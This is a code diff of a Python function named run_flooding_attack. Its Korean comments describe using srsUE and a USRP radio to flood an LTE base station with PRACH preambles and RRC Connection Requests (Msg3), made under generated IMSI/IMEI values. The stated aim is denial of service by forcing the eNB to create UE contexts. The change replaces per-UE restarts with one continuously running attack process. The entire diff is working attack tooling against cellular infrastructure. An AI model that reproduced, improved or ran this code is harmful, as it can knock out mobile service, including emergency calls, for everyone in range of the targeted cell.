@@ -158,26 +158,48 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
     current_process = None
     process_start_time = None
     current_log_file = None
+    msg3_count = 0  # Msg3 전송 횟수 추적
     
     try:
         loop_count = 0
+        # 프로세스를 한 번만 시작 (재사용)
+        imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
+        current_log_file = f"/tmp/srsue_continuous_{int(time.time() * 1000)}.log"
+        
+        try:
+            current_process = run_srsue_with_config(
+                srsue_path, template_config, current_log_file, usrp_args,
+                imsi=imsi, imei=imei,
+                usim_opc=usim_opc, usim_k=usim_k,
+                earfcn=earfcn
+            )
+            process_start_time = time.time()
+            
+            logger.info("프로세스 시작 (재사용 모드):")
+            logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
+            logger.info(f"  로그 파일: {current_log_file}")
+            logger.info(f"  프로세스 PID: {current_process.pid}")
+            logger.info(f"  USIM OPC: {'설정됨' if usim_opc else '없음'}")
+            logger.info(f"  USIM K: {'설정됨' if usim_k else '없음'}")
+            logger.info(f"  EARFCN: {earfcn if earfcn else '자동 스캔'}")
+            logger.info("프로세스 시작 완료. attack_ue가 계속 PRACH를 전송합니다...")
+        except Exception as e:
+            logger.error(f"프로세스 시작 오류: {e}")
+            return
+        
         while running_flag is None or running_flag():
             loop_count += 1
             # 첫 번째 루프에서 상태 확인
             if loop_count == 1:
-                logger.info("공격 루프 시작...")
+                logger.info("공격 루프 시작 (프로세스 재사용 모드)...")
             
-            # 현재 프로세스가 없거나 종료되었으면 다음 UE 실행
-            if current_process is None or current_process.poll() is not None:
-                # 이전 프로세스가 있으면 정리 (즉시 kill)
-                if current_process and current_process.poll() is None:
-                    current_process.kill()
-                
-                # IMSI/IMEI 생성 (UE ID는 계속 증가)
-                imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
-                current_log_file = f"/tmp/srsue_{ue_id}_{int(time.time() * 1000)}.log"
-                
+            # 프로세스가 종료되었는지 확인
+            if current_process and current_process.poll() is not None:
+                logger.warning("프로세스가 종료되었습니다. 재시작합니다...")
+                # 프로세스 재시작
                 try:
+                    imsi, imei = generate_imsi_imei(ue_id, mcc, mnc)
+                    current_log_file = f"/tmp/srsue_continuous_{int(time.time() * 1000)}.log"
                     current_process = run_srsue_with_config(
                         srsue_path, template_config, current_log_file, usrp_args,
                         imsi=imsi, imei=imei,
@@ -185,24 +207,10 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         earfcn=earfcn
                     )
                     process_start_time = time.time()
-                    
-                    # 첫 번째 UE 실행 시 상세 정보 출력
-                    if ue_id == 1:
-                        logger.info(f"첫 번째 UE 실행:")
-                        logger.info(f"  IMSI: {imsi}, IMEI: {imei}")
-                        logger.info(f"  로그 파일: {current_log_file}")
-                        logger.info(f"  프로세스 PID: {current_process.pid}")
-                        logger.info(f"  USIM OPC: {'설정됨' if usim_opc else '없음'}")
-                        logger.info(f"  USIM K: {'설정됨' if usim_k else '없음'}")
-                        logger.info(f"  EARFCN: {earfcn if earfcn else '자동 스캔'}")
-                        logger.info(f"프로세스 시작 완료. 로그 파일 생성 대기 중...")
-                    
                     ue_id += 1
-                    if (ue_id - 1) % 50 == 0:
-                        logger.info(f"진행 중... UE {ue_id - 1} 실행")
                 except Exception as e:
-                    logger.error(f"UE {ue_id} 실행 오류: {e}")
-                    ue_id += 1
+                    logger.error(f"프로세스 재시작 오류: {e}")
+                    time.sleep(1)
                     continue
             
             # RRC Connection Request 전송 확인 (DoS 최적화: Request만 보내고 즉시 종료)
@@ -283,48 +291,33 @@ def run_flooding_attack(template_config: str, usrp_args: Optional[str] = None, r
                         # RRC Connection Request (Msg3) 전송 확인 - 핵심!
                         # Msg3가 실제로 전송될 때까지 기다려야 eNB가 UE context를 생성함
                         if rrc_request_sent:
-                            # RRC Request (Msg3) 전송 확인 → eNB가 UE context 생성 후 종료
-                            if current_process.poll() is None:
-                                current_process.kill()  # Msg3 전송 완료 후 종료
-                            logger.info(f"config_{ue_id-1} 완료 (Msg3 전송됨)")
-                            current_process = None
-                            process_start_time = None
-                            current_log_file = None
+                            # RRC Request (Msg3) 전송 확인 → eNB가 UE context 생성
+                            # 프로세스는 계속 실행 (kill하지 않음)
+                            msg3_count += 1
+                            logger.info(f"Msg3 전송됨 (총 {msg3_count}회) - 프로세스 계속 실행 중")
+                            time.sleep(0.1)  # 로그 파일 업데이트 대기
                             continue
-                        # RAR 수신했을 때: Msg3 대기 (패턴 A 적용)
+                        # RAR 수신했을 때: Msg3 대기 (프로세스 계속 실행)
                         elif rar_received:
                             # RAR 수신 시에만 Msg3 대기 (최대 3초)
                             if elapsed < 3.0:
                                 continue  # Msg3 대기
                             else:
-                                # 3초 넘으면 타임아웃 종료
-                                if current_process.poll() is None:
-                                    current_process.kill()
-                                logger.info(f"config_{ue_id-1} 완료 (RAR 수신했지만 Msg3 타임아웃)")
-                                current_process = None
-                                process_start_time = None
-                                current_log_file = None
+                                # 3초 넘어도 프로세스 계속 실행 (다음 PRACH 시도)
+                                logger.debug(f"RAR 수신했지만 Msg3 타임아웃 (프로세스 계속 실행)")
+                                time.sleep(0.1)
                                 continue
-                        # RACH 전송 후 RAR 대기 중: 짧은 시간만 대기 (패턴 A - PRACH만 보내고 빠르게 종료)
-                        elif rach_sent and elapsed > 0.5:
-                            # PRACH 전송 후 0.5초만 대기하고 종료 (RAR 대기 최소화)
-                            # RAR가 오지 않으면 다음 UE로 빠르게 전환
-                            if current_process.poll() is None:
-                                current_process.kill()
-                            logger.info(f"config_{ue_id-1} 완료 (PRACH 전송됨, RAR 대기 중 종료)")
-                            current_process = None
-                            process_start_time = None
-                            current_log_file = None
+                        # RACH 전송 후 RAR 대기 중 (프로세스 계속 실행)
+                        elif rach_sent:
+                            # PRACH 전송 확인 - attack_ue가 계속 PRACH를 보내므로 대기
+                            logger.debug(f"PRACH 전송됨 (프로세스 계속 실행)")
+                            time.sleep(0.1)
                             continue
-                        # PBCH 디코딩 실패
-                        elif pbch_failed and elapsed > 1.0:
-                            # PBCH 디코딩 실패이고 1초 이상 지났으면 다음으로
-                            if current_process.poll() is None:
-                                current_process.kill()
-                            logger.info(f"config_{ue_id-1} 완료")
-                            current_process = None
-                            process_start_time = None
-                            current_log_file = None
+                        # PBCH 디코딩 실패 (프로세스 계속 실행)
+                        elif pbch_failed:
+                            # PBCH 디코딩 실패해도 프로세스 계속 실행 (셀 재검색)
+                            logger.debug(f"PBCH 디코딩 실패 (프로세스 계속 실행)")
+                            time.sleep(0.1)
                             continue
                     except Exception as e:
                         logger.debug(f"로그 파일 읽기 오류: {e}")
